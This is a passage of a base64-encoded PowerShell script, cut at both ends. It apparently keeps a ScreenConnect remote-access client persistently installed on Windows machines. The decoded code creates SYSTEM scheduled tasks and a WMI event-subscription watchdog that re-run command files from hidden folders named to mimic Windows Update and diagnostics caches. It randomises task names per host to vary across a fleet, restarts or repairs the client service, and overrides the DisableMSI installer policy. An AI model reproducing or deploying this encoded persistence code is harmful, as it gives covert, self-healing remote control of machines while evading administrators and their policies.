TElTVCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUgMCAtb3IgLW5vdCAkb3V0
KSB7IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8i
IH0pIC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10kdG4s
IFtzdHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9ubHkgaWYgdGhlIHNjaGVkdWxlZCBhY3Rp
b24gcG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCUIG5vdCBhIFdpbmRvd3MgQ09NIGhhbmRs
ZXIuCiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAgICBpZiAoLW5vdCAkYmxv
YikgeyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFya2VyIC1hbmQgKCRibG9iIC1tYXRjaCBb
cmVnZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICBpZiAoJGJsb2Ig
LW1hdGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLmV0bGNh
Y2hlXFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIElu
aXRpYWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90ZW50IHdpdGhpbiBhbiBJREVOVFZFUiBn
ZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6CiAgICAjIG93bmVkIG9sZC1u
YW1lIHRhc2tzIGFyZSBkZWxldGVkOyBXaW5kb3dzIGJ1aWx0LWlucyB3aXRoIHNhbWUgbmFtZSBh
cmUgbGVmdCBhbG9uZS4KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICAkb2xk
ID0gUmVhZC1JZGVudGl0eQogICAgICAgICMgTDc6IGFsc28gcmVnZW5lcmF0ZSBpZiBhbnkgVEFT
S18qIGlzIGVtcHR5IChMNC1MNiBtb2R1bG8vY2FzdCBidWdzIGxlZnQgYmxhbmsgc2xvdHMpCiAg
ICAgICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAt
YW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xkWydUQVNLX0Mn
XSAtYW5kICRvbGRbJ1RBU0tfRCddCiAgICAgICAgaWYgKCRzbG90c09rKSB7IHJldHVybiAkb2xk
IH0KICAgICAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19DJywnVEFT
S19EJykgewogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtdCiAgICAgICAgICAgIGlm
ICgtbm90ICR0bikgeyBjb250aW51ZSB9CiAgICAgICAgICAgICMgTmV2ZXIgZGVsZXRlIGEgcmVh
bCBXaW5kb3dzIHRhc2sgd2UgbmV2ZXIgb3duZWQgKFRSIGlzIENPTS9jdXN0b20gaGFuZGxlciku
CiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykgeyBSZW1vdmUtVGFza1F1
aWV0ICR0biB9CiAgICAgICAgfQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkY2Zn
UGF0aCAtRm9yY2UKICAgIH0KICAgICRzID0gR2V0LUhvc3RTZWVkCiAgICAjIEw0OiB0d28gc2xv
dHMgbWF5IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBzaGFyZSBuYW1lcykgLT4K
ICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdvIHNsb3RzIGFuZCB0aGUg
ZmxlZXQgc2hvd3MgMy80LgogICAgIyBXYWxrIGVhY2ggcG9vbCBmb3J3YXJkIHVudGlsIHRoZSBw
aWNrIGlzIHVuaXF1ZSBhY3Jvc3Mgc2xvdHMuCiAgICAjIEw2OiB0aGUgb2xkIEAoQCgnQScsICRz
ICUgOCksIC4uLikgZm9ybSB3YXMgZG91YmxlLWJyb2tlbiBpbiBQUyA1LjE6CiAgICAjIGJhcmUg
JSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5vdCBtb2R1
bG8pLCBzbyB0aGUKICAgICMgY29sbGVjdGlvbiBjb2xsYXBzZWQgYW5kIHRoZSBsb29wIG5ldmVy
IHJhbiAtPiBpZGVudGl0eS5jZmcgaGFkIEVNUFRZCiAgICAjIFRBU0tfKiBhbmQgdGhlIHdob2xl
IGZsZWV0IGZlbGwgYmFjayB0byBpZGVudGljYWwgZGVmYXVsdCB0YXNrIG5hbWVzLgogICAgJHNl
ZWRzID0gW29yZGVyZWRdQHsKICAgICAgICBBID0gKCRzICUgOCkKICAgICAgICBCID0gKCgkcyAr
IDMpICUgOCkKICAgICAgICBDID0gKCgkcyArIDUpICUgOCkKICAgICAgICBEID0gKCgkcyArIDcp
ICUgOCkKICAgIH0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9CiAgICBmb3JlYWNoICgkbGV0dGVy
IGluICdBJywnQicsJ0MnLCdEJykgewogICAgICAgICRpID0gW2ludF0kc2VlZHNbJGxldHRlcl0K
ICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0KICAgICAgICAkbiA9IDAKICAgICAg
ICB3aGlsZSAoJHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5kICRuIC1sdCA4KSB7ICRp
ID0gKCRpICsgMSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV07ICRuKysgfQogICAg
ICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9
CiAgICAgICAgJHBpY2tbJGxldHRlcl0gPSAkbmFtZQogICAgfQogICAgJGNmZyA9IEAoCiAgICAg
ICAgIlRBU0tfQT0kKCRwaWNrLkEpIgogICAgICAgICJUQVNLX0I9JCgkcGljay5CKSIKICAgICAg
ICAiVEFTS19DPSQoJHBpY2suQykiCiAgICAgICAgIlRBU0tfRD0kKCRwaWNrLkQpIgogICAgICAg
ICJNT19BPSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWluIGppdHRlcgogICAgICAg
ICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWluIGppdHRlcgogICAgICAg
ICJTRUVEPSRzIgogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9uIgogICAgKQogICAgU2V0
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1WYWx1ZSAkY2ZnIC1Gb3JjZQogICAgcmV0
dXJuIChSZWFkLUlkZW50aXR5KQp9CgpmdW5jdGlvbiBOb3JtYWxpemUtVGFza05hbWUoW3N0cmlu
Z10kdG4pIHsKICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQogICAgcmV0dXJuICR0bi5U
cmltKCkuVHJpbVN0YXJ0KCdcJykKfQoKZnVuY3Rpb24gV3JpdGUtT3duTG9nKFtzdHJpbmddJG0p
IHsKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJwogICAgdHJ5IHsgQWRk
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9IGNhdGNoIHt9Cn0K
CmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3MgewogICAgIyBNaXJyb3Igd29ya2luZyBkZXRh
Y2ggKFd1Y2FjaGVPd24pOiBjbWQgc2NodGFza3MsIEJPT1QgVFIgcGF0aCwgL1NUIG9uIE1JTlVU
RS4KICAgICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHkKICAgIGlmICgtbm90ICRNb25QYXRoKSB7
ICRNb25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQogICAgJGJvb3Qg
PSBKb2luLVBhdGggJGVudjpTeXN0ZW1Sb290ICdUZW1wXC53dWNhY2hlJwogICAgJGV0bERpciA9
ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZScKICAg
IGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIpKSB7CiAgICAgICAgaWYgKC1ub3QgKFRl
c3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3Rvcnkg
LVBhdGggJGQgLUZvcmNlIHwgT3V0LU51bGwgfQogICAgfQogICAgJGJvb3RNb24gPSBKb2luLVBh
dGggJGJvb3QgJ293bl9tb24uY21kJwogICAgJGJvb3RFdGwgPSBKb2luLVBhdGggJGJvb3QgJ2V0
bF9tb24uY21kJwogICAgJGV0bE1vbiA9IEpvaW4tUGF0aCAkZXRsRGlyICdldGxfbW9uLmNtZCcK
ICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNb25QYXRoKSB7CiAgICAgICAgQ29weS1J
dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RNb24gLUZvcmNlIC1F
cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0
aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGJvb3RFdGwgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVz
dGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
IH0KICAgICMgQk9PVCBpcyBub3QgTG9ja0RpcidkIGJ5IG93bl9zZWN1cmUg4oCUIFRhc2sgU2No
ZWR1bGVyIGNhbiByZXNvbHZlIFRSIHRoZXJlLgogICAgJHRyTW9uID0gImNtZC5leGUgL2MgJGJv
b3RNb24iCiAgICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCIKICAgICRtb0EgPSBbc3Ry
aW5nXSRpZFsnTU9fQSddOyBpZiAoLW5vdCAkbW9BKSB7ICRtb0EgPSAnMicgfQogICAgJG1vQiA9
IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1vQiA9ICczJyB9CiAgICAk
c3QgPSAoR2V0LURhdGUpLlRvU3RyaW5nKCdISDptbScpCiAgICAkc3BlY3MgPSBAKAogICAgICAg
IEB7IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUn
OyBNbyA9ICRtb0E7IFRyID0gJHRyTW9uIH0KICAgICAgICBAeyBLZXkgPSAnVEFTS19CJzsgTWFy
a2VyID0gJ2V0bF9tb24uY21kJzsgU2MgPSAnTUlOVVRFJzsgTW8gPSAkbW9COyBUciA9ICR0ckV0
bCB9CiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQyc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNj
ID0gJ09OU1RBUlQnOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9CiAgICAgICAgQHsgS2V5ID0gJ1RB
U0tfRCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9ICcnOyBU
ciA9ICR0ck1vbiB9CiAgICApCiAgICAkb2sgPSAwOyAkcmVhcm1lZCA9IDA7ICRmYWlsID0gMAog
ICAgZm9yZWFjaCAoJHNwIGluICRzcGVjcykgewogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNr
TmFtZSAoW3N0cmluZ10kaWRbJHNwLktleV0pCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7ICRmYWls
Kys7IGNvbnRpbnVlIH0KICAgICAgICBpZiAoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtl
cikgeyAkb2srKzsgY29udGludWUgfQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICgiXCR0
biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0KICAgICAgICAkYmxvYiA9IEdldC1U
YXNrVmVyYm9zZUJsb2IgJHRuCiAgICAgICAgaWYgKC1ub3QgJGJsb2IpIHsgJGJsb2IgPSBHZXQt
VGFza1ZlcmJvc2VCbG9iICgiXCR0biIpIH0KICAgICAgICBpZiAoJGJsb2IpIHsKICAgICAgICAg
ICAgJG91cnNCcm9rZW4gPSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25c
LmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQogICAgICAgICAgICBpZiAoLW5vdCAkb3Vy
c0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRhc2tzX3NraXBfZm9yZWlnbiAkdG4i
OyBjb250aW51ZSB9CiAgICAgICAgICAgIFJlbW92ZS1UYXNrUXVpZXQgJHRuCiAgICAgICAgICAg
IFJlbW92ZS1UYXNrUXVpZXQgKCJcJHRuIikKICAgICAgICB9CiAgICAgICAgIyBCdWlsZCBjbWRs
aW5lIGV4YWN0bHkgbGlrZSBvd24uY21kIGRldGFjaCAocHJvdmVuIHRvIHdvcmsgYXMgU1lTVEVN
KS4KICAgICAgICAkcGFydHMgPSBAKAogICAgICAgICAgICAnL0NyZWF0ZScsICcvVE4nLCAkdG4s
ICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNUJywgJy9GJywKICAgICAgICAgICAgJy9U
UicsICRzcC5UciwgJy9TQycsICRzcC5TYwogICAgICAgICkKICAgICAgICBpZiAoJHNwLlNjIC1l
cSAnTUlOVVRFJykgewogICAgICAgICAgICAkcGFydHMgKz0gQCgnL01PJywgJHNwLk1vLCAnL1NU
JywgJHN0KQogICAgICAgIH0KICAgICAgICAkYXJnTGluZSA9ICgkcGFydHMgfCBGb3JFYWNoLU9i
amVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ1tccyJdJykgeyAnInswfSInIC1mICgk
XyAtcmVwbGFjZSAnIicsICdcIicpIH0gZWxzZSB7ICRfIH0KICAgICAgICB9KSAtam9pbiAnICcK
ICAgICAgICAkY3JlYXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAy
PiYxIHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0KICAgICAgICAkY3JlYXRlSm9pbmVkID0gKCRj
cmVhdGVUeHQgLWpvaW4gJyAnKS5UcmltKCkKICAgICAgICBXcml0ZS1Pd25Mb2cgInRhc2tzX2Ny
ZWF0ZSAkKCRzcC5LZXkpICR0biA9PiAkY3JlYXRlSm9pbmVkIgogICAgICAgIGlmICgoVGVzdC1U
YXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIp
ICRzcC5NYXJrZXIpKSB7CiAgICAgICAgICAgICRyZWFybWVkKysKICAgICAgICAgICAgaWYgKCRz
cC5LZXkgLWVxICdUQVNLX0EnIC1vciAkc3AuS2V5IC1lcSAnVEFTS19CJykgewogICAgICAgICAg
ICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAiJHRuYCIiIHwgT3V0LU51
bGwKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRmYWlsKysKICAg
ICAgICAgICAgV3JpdGUtT3duTG9nICJ0YXNrc19jcmVhdGVfRkFJTCAkKCRzcC5LZXkpICR0biIK
ICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gInRhc2tzIG9rPSRvayByZWFybWVkPSRyZWFybWVk
IGZhaWw9JGZhaWwiCn0KCmZ1bmN0aW9uIFJlbW92ZS1XYXRjaGRvZyB7CiAgICBmb3JlYWNoICgk
Y2xzIGluIEAoJ19fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcnLCdfX0V2ZW50RmlsdGVyJywnQ29t
bWFuZExpbmVFdmVudENvbnN1bWVyJywnX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24nKSkgewog
ICAgICAgIEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3Mg
JGNscyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9i
amVjdCB7CiAgICAgICAgICAgICAgICAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRvZ0YnKSAt
b3IgKCRfLk5hbWUgLWVxICdXdWNhY2hlV2F0Y2hkb2dDJykgLW9yCiAgICAgICAgICAgICAgICAo
JF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRvZycpIC1vcgogICAgICAgICAgICAgICAgKCRf
LkZpbHRlciAtYW5kICRfLkZpbHRlci5Ub1N0cmluZygpIC1saWtlICcqV3VjYWNoZVdhdGNoZG9n
RionKSAtb3IKICAgICAgICAgICAgICAgICgkXy5Db25zdW1lciAtYW5kICRfLkNvbnN1bWVyLlRv
U3RyaW5nKCkgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicpCiAgICAgICAgICAgIH0gfCBGb3JF
YWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwgfQogICAgfQp9CgpmdW5jdGlvbiBJ
bnN0YWxsLVdhdGNoZG9nIHsKICAgIGlmICgtbm90ICRNb25QYXRoKSB7IHJldHVybiAkZmFsc2Ug
fQogICAgUmVtb3ZlLVdhdGNoZG9nCiAgICAkb2sgPSAkdHJ1ZQogICAgdHJ5IHsKICAgICAgICBT
ZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19JbnRl
cnZhbFRpbWVySW5zdHJ1Y3Rpb24gYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IFRpbWVySWQg
PSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNlY29uZHMgPSAxODAwMDA7IFNraXBJ
ZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwKICAgICAgICAkZiA9IFNldC1XbWlJbnN0YW5j
ZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0V2ZW50RmlsdGVyIGAKICAg
ICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0YnOyBFdmVudE5h
bWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9ICdXUUwnOwogICAgICAgICAg
ICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAqIEZST00gX19UaW1lckV2ZW50IFdIRVJF
IFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0KICAgICAgICAkYyA9IFNldC1XbWlJbnN0YW5j
ZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBDb21tYW5kTGluZUV2ZW50Q29u
c3VtZXIgYAogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdhdGNoZG9n
Qyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5J
bnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0KICAgICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFj
ZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgCiAg
ICAgICAgICAgIC1Bcmd1bWVudHMgQHsgRmlsdGVyID0gJGY7IENvbnN1bWVyID0gJGMgfSB8IE91
dC1OdWxsCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0KICAgIHJldHVybiAkb2sKfQoKZnVu
Y3Rpb24gVGVzdC1XYXRjaGRvZ0dyYXBoIHsKICAgICR0ID0gR2V0LVdtaU9iamVjdCAtTmFtZXNw
YWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbiAt
RmlsdGVyICJUaW1lcklkPSdXdWNhY2hlV2F0Y2hkb2cnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRp
b24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdhdGNoZG9nRici
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAkYyA9IEdldC1XbWlPYmplY3QgLU5h
bWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVy
IC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZQogICAgJGIgPSAkbnVsbAogICAgaWYgKCRmIC1hbmQgJGMpIHsKICAgICAgICAkYiA9
IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19GaWx0
ZXJUb0NvbnN1bWVyQmluZGluZyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAg
ICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkZpbHRlciAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0Yq
JyAtYW5kICRfLkNvbnN1bWVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nQyonIH0gfAogICAgICAg
ICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICB9CiAgICByZXR1cm4gW2Jvb2xdKCR0IC1h
bmQgJGYgLWFuZCAkYyAtYW5kICRiKQp9CgpmdW5jdGlvbiBFbnN1cmUtV2F0Y2hkb2cgewogICAg
aWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4gJ09LJyB9CiAgICBpZiAoLW5vdCAkTW9u
UGF0aCkgeyByZXR1cm4gJ01JU1NJTkcnIH0KICAgIGlmIChJbnN0YWxsLVdhdGNoZG9nKSB7IHJl
dHVybiAnUkVBUk1FRCcgfQogICAgcmV0dXJuICdGQUlMJwp9CgojIENvcnJlY3QgMzItYml0ICsg
NjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRydW5jYXRlZAojIFdPVzY0
MzJOb2RlIHBhdGggKG1pc3NpbmcgTWljcm9zb2Z0XFdpbmRvd3MpIHNvIEVWRVJZIDMyLWJpdCBT
QyBwcm9kdWN0CiMgd2FzIGludmlzaWJsZSB0byByZXBhaXIvZXh0ZXJtaW5hdGUvcmVnaXN0ZXJl
ZC4KJHNjcmlwdDpVbmluc3RhbGxSb290cyA9IEAoCiAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9z
b2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsJywKICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGwn
CikKCmZ1bmN0aW9uIFRlc3QtU0NSZWdpc3RlcmVkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAg
ICAjIEw4OiBORVZFUiB1c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkg
ZXhpdHMgdGhlCiAgICAjIHBpcGVsaW5lIGl0ZXJhdGlvbiwgc28gdGhpcyBmdW5jdGlvbiBhbHdh
eXMgZmVsbCB0aHJvdWdoIHRvICdubycKICAgICMgYW5kIHRoZSBtb24gb3JwaGFuLWxhZGRlciBk
ZWxldGVkIGhlYWx0aHkgcmVnaXN0ZXJlZCBzZXJ2aWNlcy4KICAgIGlmICgtbm90ICRGaW5nZXJw
cmludCkgeyByZXR1cm4gJ25vJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAo
JEZpbmdlcnByaW50KSIKICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9v
dHMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAg
ICAgICAgZm9yZWFjaCAoJGtleSBpbiAoR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSkpIHsKICAgICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkg
JGtleS5QU1BhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAg
ICAgICAgICAgIGlmICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGls
ZE5hbWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9CiAgICAgICAgfQogICAgfQogICAg
cmV0dXJuICdubycKfQoKZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShbc3RyaW5nXSRGaW5nZXJw
cmludCkgewogICAgIyBSZWNyZWF0ZXMgYSBkZWxldGVkIFNDIHNlcnZpY2UgZW50cnkgYnkgcmVw
YWlyaW5nIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3QuCiAgICAjIG1zaWV4ZWMgL2ZhIHtHVUlEfSBy
ZXBhaXJzIGluIHBsYWNlIC0gaXQgZG9lcyBOT1QgcnVuIHRoZSBTQy1mYW1pbHkKICAgICMgbWFq
b3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0YW5jZXMgYXJlIHVudG91Y2hlZC4KICAg
ICMgTDU6IGFsc28gaGFuZGxlcyBwcmVzZW50LWJ1dC1TVE9QUEVEIHNlcnZpY2VzIChyZXBhaXIg
cmVzdG9yZXMgYmluYXJpZXMsCiAgICAjIHRoZW4gc3RhcnQpLiBPbmx5IGEgUnVubmluZyBzZXJ2
aWNlIGlzIGNvbnNpZGVyZWQgaGVhbHRoeS4KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyBy
ZXR1cm4gJ25vLWZwJyB9CiAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJEZpbmdl
cnByaW50KSIKICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEgJ1J1bm5p
bmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0KICAgICRndWlkID0gJG51bGwKICAgIGZvcmVh
Y2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsKICAgICAgICBpZiAoLW5vdCAo
VGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9CiAgICAgICAgZm9yZWFjaCAoJGtleSBpbiAo
R2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkpIHsKICAg
ICAgICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJGtleS5QU1BhdGggLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAo
JGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpKSB7ICRn
dWlkID0gJGtleS5QU0NoaWxkTmFtZTsgYnJlYWsgfQogICAgICAgIH0KICAgICAgICBpZiAoJGd1
aWQpIHsgYnJlYWsgfQogICAgfQogICAgaWYgKC1ub3QgJGd1aWQpIHsgcmV0dXJuICdub3QtcmVn
aXN0ZXJlZCcgfQogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
aWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1O
dWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxX
aW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYx
IHwgT3V0LU51bGwKICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgIm1zaV9yZXBhaXJfJEZp
